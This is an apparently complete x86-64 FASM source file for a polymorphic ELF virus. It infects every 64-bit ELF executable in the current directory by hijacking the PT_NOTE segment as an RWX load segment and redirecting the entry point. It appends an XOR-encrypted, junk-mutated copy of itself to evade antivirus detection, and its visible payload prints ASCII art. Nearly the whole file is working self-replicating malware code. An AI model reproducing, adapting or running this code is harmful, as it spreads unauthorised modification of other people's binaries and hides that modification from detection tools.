
format ELF64 executable 3

;;; system calls
SYS_WRITE = 1
SYS_OPEN = 2
SYS_CLOSE = 3
SYS_STAT = 4
SYS_FSTAT = 5
SYS_LSEEK = 8
SYS_MMAP = 9
SYS_MPROTECT = 10
SYS_MUNMAP = 11
SYS_MSYNC = 26
SYS_EXIT = 60
SYS_UNLINK = 87
SYS_GETDENTS64 = 217

;;; offsets in useful structs
;; from struct linux_dirent64 in /usr/include/dirent.h
D_RECLEN = 8 + 8                ; sizeof ino64_t + sizeof off64_t
D_TYPE = 8 + 8 + 2              ; sizeof ino64_t + sizeof off64_t + sizeof unsigned short
D_NAME = 8 + 8 + 3              ; sizeof ino64_t + sizeof off64_t + sizeof unsigned short + sizeof char

;; from struct Elf64_Ehdr
E_ENTRY = 16+2+2+4
E_PHOFF = 16+2+2+4+8
E_PHENTSIZE = 16+2+2+4+8+8+8+4+2
E_PHNUM = 16+2+2+4+8+8+8+4+2+2

;; from struct Elf64_Phdr
P_TYPE = 0                      ; type: PT_NOTE, PT_LOAD, PT_DYNAMIC, etc
P_FLAGS = 4
P_OFFSET = 4+4
P_VADDR = 4+4+8
P_PADDR = 4+4+8+8
P_FILESZ = 4+4+8+8+8
P_MEMSZ = 4+4+8+8+8+8
P_ALIGN = 4+4+8+8+8+8+8


;; from /usr/include/elf.h, e_ident member of Elf64_Ehdr struct
EI_CLASS = 4                    ; past 4 magic bytes 0x7f, 'E', 'L', 'F'
EI_PAD = 9                      ; offset of unused bytes in e_ident
;; from struct stat
ST_SIZE = 48

;;; options
O_RDWR = 2
O_RDONLY = 0
DT_REG = 8                      ; from /usr/include/dirent.h
PROT_READ = 4
PROT_WRITE = 2
MAP_SHARED = 1
NULL = 0                        ; for clarity with mmap()
MS_SYNC = 4                     ; for msync, immediately syncs the mmaped file to disk
SEEK_END = 2
PT_NOTE = 4
PT_LOAD = 1
PF_R = 4                        ; both used to set infected segment to RX
PF_W = 2
PF_X = 1                        ; both used to set infected segment to RX

ELFCLASS64 = 2

;;; virus offsets
DELTA_ADDRESS = 0               ; stack offset for storing delta offset (offset of virus in memory)
THIS_FILE = 8                   ; stack offset for storing stat struct for this file, argv[0]
OTHER_FILE = 200                ; stack offset for storing stat structs for other files
NOTE_NAME  = 800                ; stack offset for storing PT_NOTE name, to ignore Go binaries
DIRENTS = 1000                  ; stack offset for storing directory entries
OEP = 4000                      ; original entry point of file, to jmp to at the end
RJMP = 4050                     ; holds jmp from end of virus to start of file

;;; virus constants
VIRUS_STACK = 5000              ; number of stack bytes for virus activities
GETDENTS_COUNT = 2048           ; number of bytes for storing directory entries
VIRUS_IDENTIFIER = 0x0041534e   ; 'NSA', used to mark infected executables
GOBIN_IDENTIFIER = 0x00006f47   ; Go\x00\x00, PT_NOTE name field for Go binaries
VIRUS_SIZE = 931                ; size of virus code, used to check if this is gen 0


segment readable writable executable

entry virus_start

virus_start:
;;; BEGIN DECRYPT STUB

    jmp pre_stub+4
pre_stub:
    dd 0xcafebeef               ; junk code, will be jumped over
    mov r14, [rsp + 8]          ; save argv[0] into r14, happens to be 8 bytes from rsp
    push rdx
    sub rsp, VIRUS_STACK        ; allocate stack bytes for virus activities
    mov r15, rsp                ; save beginning of virus stack in r15


;;; get delta offset to compute other offsets later

    call _delta+4                                  ; jump over junk code

_delta:
    db 0x4                                         ; these can be any instructions
    db 0x3                                         ; they are only here because
    db 0xe9                                        ; AV can detect call+pop easily
    db 0xf0
    pop rbp                                     ; rbp = offset of _delta + start address

    sub rbp, _delta                             ; rbp = 0 on gen 0, addr of code afterwards
    mov [r15 + DELTA_ADDRESS], rbp              ; save delta onto stack, rbp + DELTA_ADDRESS


stub:
    call run_stub
key:
    db 0x00                     ; null key, to not encrypt the code on gen0

run_stub:                       ; will decrypt the following code
    pop r9                      ; get key to use in r9

    mov r9, [r9]                ; r9 is address of key, access key at the addr
    jmp setup_decrypt+5

setup_decrypt:
    dd 0x1baddeed               ; more junk code
    db 0xf9
    ;; xor bytes using key
    mov rcx, virus_end - rest_of_code
    add rcx, 5                  ; include space for jmp
    mov rsi, [r15 + DELTA_ADDRESS]
    add rsi, rest_of_code       ; source = start of encrypted code
    mov rdi, rsi                ; destination = source, xor in place

    jmp decrypt+4
decrypt:
    db 0xf0, 0xbf, 0x38, 0xe9   ; more junk code instructions

    lodsb                      ; load single byte from rsi to al
    ; preserve null bytes
    cmp al, 0x00
    jz .store
    cmp al, r9b
    jz .store

    ; otherwise xor
    xor al, r9b
  .store:
    stosb                       ; store byte back at rsi
    loop decrypt+4


    xor r9, r9

;;; END DECRYPT STUB

rest_of_code:
;;; get stat of current file
    lea rsi, [r15 + THIS_FILE]          ; stack space for stat buffer
    mov rdi, r14                        ; filename: argv[0]
    mov rax, SYS_STAT
    syscall

;;; open current directory
    push 0x2e
    mov rdi, rsp                ; filename: "."
    xor rsi, rsi                ; flags: 0
    mov rdx, O_RDONLY           ; mode: O_RDONLY
    mov rax, SYS_OPEN
    syscall

    pop rdi                     ; take "." off the stack
    test rax, rax
    js final                    ; if we can't open directory, quit


    jmp get_files+4
get_files:
    db 0xf0, 0xbf, 0x38, 0xe9   ; more junk code instructions
    mov r12, rax

;;; call getdents64

    mov rdi, r12                 ; fd for current directory
    lea rsi, [rsp + DIRENTS]       ; stack space for directory entries
    mov rdx, GETDENTS_COUNT
    mov rax, SYS_GETDENTS64
    syscall

    test rax, rax
    js final

    mov qword [r15 + 990], rax  ; save number of entries to stack

;;; close directory fd
    mov rdi, r12                 ; directory fd
    mov rax, SYS_CLOSE          ; close
    syscall

    xor r12, r12                ; holds fd of current file
    xor rcx, rcx                ; zero dirent offset before file_loop

;;; loop through entries    
file_loop:
    push rcx
    
    ;; this is a file, so let's open it
    lea rdi, [r15 + DIRENTS + rcx + D_NAME] ; filename: current file
    xor rdx, rdx                         ; flags: 0
    mov rsi, O_RDWR                      ; mode: RW
    mov rax, SYS_OPEN
    syscall

    test rax, rax
    js .next_entry

    mov r12, rax                          ; save file descriptor

;;; get stat of the file
    lea rsi, [r15 + OTHER_FILE]
    mov rdi, r12                          ; file descriptor
    mov rax, SYS_FSTAT
    syscall

    test rax, rax
    js .close_file


    ;; mmap opened file
    mov r10, MAP_SHARED                   ; flags: MAP_SHARED
    xor r9, r9                            ; offset 0 in fd 
    mov r8, r12                           ; fd
    mov rdx, PROT_READ or PROT_WRITE      ; 0x4 | 0x2 = 0x6 (RW)
    mov rsi, [r15 + OTHER_FILE + ST_SIZE] ; size of current file
    mov rdi, NULL
    mov rax, SYS_MMAP
    syscall

    ;; check if MMAP succeeded
    test rax, rax
    js .close_file

    ;; save memory address
    mov r11, rax
    ;; perform checks on file
    
    ;; check if ELF
    cmp dword [r11], 0x464c457f         ; 0x7f, 'E', 'L', 'F'
    jnz .unmap_file

    ;; check if 64 bit
    cmp byte [r11 + EI_CLASS], ELFCLASS64
    jnz .unmap_file
    
    ;; unmap if identifier is present
    cmp dword [r11 + EI_PAD], VIRUS_IDENTIFIER
    jz .unmap_file

    ;; infect file
    

    ;; search through phdr entries
    xor rcx, rcx                                    ; initialize counter to zero
    xor rax, rax                                    ; address of phdrs
    xor r13, r13                                    ; offset of phdr, phentsize++
    
    mov word cx, [r11+E_PHNUM]                      ; loop counter: # of phdrs
    mov rdx, [r11+E_PHOFF]                          ; rdx: offset from start of phdrs
    lea rax, [r11 + rdx]                            ; rax: address of phdrs (start + e_phoff)
    

.search_phdrs:
    cmp dword [rax + r13 + P_TYPE], PT_NOTE
    jz .patch_phdr
    add r13w, word [r11+E_PHENTSIZE]                      ; increment offset by phentsize
    loop .search_phdrs

    ;; exited loop without finding PT_NOTE, so just go to next file
    jmp .unmap_file

.patch_phdr:

    ;; final check: unmap if this is a Go binary

    mov rdx, qword [rax + r13 + P_OFFSET]                 ; get addr
    add rdx, 12                                           ; 12 is offset of PT_NOTE name
    
    cmp dword [r11 + rdx], GOBIN_IDENTIFIER               ;
    jz .unmap_file


    mov dword [rax + r13 + P_TYPE], PT_LOAD               ; set type to PT_LOAD
    ;; mov dword [rax + r13 + P_FLAGS], PF_R or PF_X         ; set RX permissions
    mov dword [rax + r13 + P_FLAGS], PF_R or PF_W or PF_X ; set RWX permissions BUG: fix this maybe?
    mov dword [rax + r13 + P_ALIGN], 0x200000             ; alignment of LOAD segment

    push r12                    ; use r12 but save as it holds the fd
    mov r12, [r15 + OTHER_FILE + ST_SIZE]
    mov qword [rax + r13 + P_OFFSET], r12                 ; offset = original EOF

    mov qword [rax + r13 + P_VADDR], r12                  ; load virus at EOF
    add qword [rax + r13 + P_VADDR], 0xd000000            ; load far from legit code
    pop r12


    add qword [rax + r13 + P_MEMSZ], virus_end - virus_start + 5    ; virus + oep jmp
    add qword [rax + r13 + P_FILESZ], virus_end - virus_start + 5
    
.patch_ehdr:
    mov dword [r11 + EI_PAD], VIRUS_IDENTIFIER      ; mark file as infected
    push r12
    mov r12, qword [r11+E_ENTRY]
    mov qword [r15+OEP], r12                        ; save OEP for later

    mov r12, qword [rax + r13 + P_VADDR]
    mov qword [r11 + E_ENTRY], r12                  ; update EP to virus code

.infect:
    ;; create jmp to OEP on the stack
    xor r12, r12
    mov r12, qword [r15 + OEP]                      ; addr = OEP
    sub r12, [rax + r13 + P_VADDR]                  ; addr = start of virus code
    sub r12, virus_end - virus_start                ; addr = end of virus code
    sub r12, 5                                      ; addr = end of jmp

    mov byte [r15 + RJMP], 0xe9                      ; relative jmp opcode 0xe9
    mov dword [r15 + RJMP + 1], r12d                 ; relative jmp to OEP
    pop r12

    ; seek to the end of the file
    mov rdx, SEEK_END
    xor rsi, rsi
    mov rdi, r12
    mov rax, SYS_LSEEK
    syscall


    ;; copy virus code to stack
    sub rsp, virus_end - virus_start + 5; allocate space on the stack

    xor rax, rax
    mov rdi, rsp
    mov rsi, [r15 + DELTA_ADDRESS]
    add rsi, virus_start             ; rsi = start of virus code
    mov rcx, virus_end - virus_start ; copy code but stop at jmp

    .copy_virus_to_stack:
    lodsb
    stosb
    loop .copy_virus_to_stack   ; simple copy loop

    ;; set up key
    rdrand ax                   ; random key
    add byte [rsp + key - virus_start], al
    xor rbx, rbx
    mov bl, byte [rsp + key - virus_start]

    ;; add jump to virus code on stack
    mov r8d, dword [r15 + RJMP + 1]
    mov byte [rsp + virus_end - virus_start], 0xe9 ; add e9 jmp opcode
    mov dword [rsp + virus_end - virus_start + 1], r8d ; add relative jmp offset

    ;; just for fun
    ;; mutate offset junk instructions
    rdrand eax
    mov dword [rsp + _delta - virus_start], eax

    rdrand eax
    mov dword [rsp + decrypt - virus_start], eax

    rdrand eax
    mov dword [rsp + get_files - virus_start], eax

    rdrand eax
    mov dword [rsp + pre_stub - virus_start], eax

    rdrand eax
    mov dword [rsp + setup_decrypt - virus_start], eax
    mov byte [rsp + setup_decrypt - virus_start + 4], al

    ;; set up encryption loop
    xor rcx, rcx
    mov rcx, virus_end - rest_of_code + 5; counter: number of bytes after the stub
    lea rsi, [rsp + rest_of_code - virus_start]
    mov rdi, rsi

    .encrypt_virus:
    lodsb
    cmp al, 0x00
    jz .store_two
    cmp al, bl
    jz .store_two

    xor al, bl

  .store_two:
    stosb
    loop .encrypt_virus

    ;; write virus code to end of the file
    ;; polymorphic virus: use encrypted code on stack

    mov rdx, virus_end - virus_start + 5
    mov rsi, rsp
    mov rdi, r12
    mov rax, SYS_WRITE
    syscall

    add rsp, virus_end - virus_start + 5; unallocate space on the stack


    ;; msync and munmap file
.unmap_file:
    xor rdx, rdx
    xor rdi, rdi
    xor rsi, rsi
    
    mov rdx, MS_SYNC
    mov rsi, [r15 + OTHER_FILE + ST_SIZE]
    mov rdi, r11
    mov rax, SYS_MSYNC
    syscall

    ; mov rsi, [r15 + OTHER_FILE + ST_SIZE] ; st_size of current file
    ; mov rdi, r11                          ; address of mapped region
    mov rax, SYS_MUNMAP
    syscall


    ;; close file
.close_file:
    mov rax, SYS_CLOSE
    mov rdi, r12
    syscall


;;; check if we are done and put offset of next entry in rcx
.next_entry:
    pop rcx
    add cx, word [r15 + DIRENTS + rcx + D_RECLEN] ; move to next dirent structure
    cmp rcx, [r15 + 990]                       ; if rcx == getdents64() return value, we are done
    jne file_loop


;;; we're out of the file loop, run the payload
    
    call payload
msg:
    include 'art.asm'           ; include payload at this line
    len = $-msg

payload:                        ; a noticeable but not invasive payload
    pop rsi                     ; address of string on stack after call
    mov rdx, len                ; length of string defined by fasm
    mov rdi, 1                  ; we are writing to stdout
    mov rax, SYS_WRITE
    syscall


;;; cleanup
final:                          ; clean up the stack and reset registers
    add rsp, VIRUS_STACK
    pop rdx

virus_end:                      ; on gen 0 call exit

    mov rax, 60                 ; or instead jmp to OEP if in infected file
    xor rdi, rdi
    ;mov rdi, 42                 ; code in this file under virus_end
    syscall                     ; will only run on generation 0
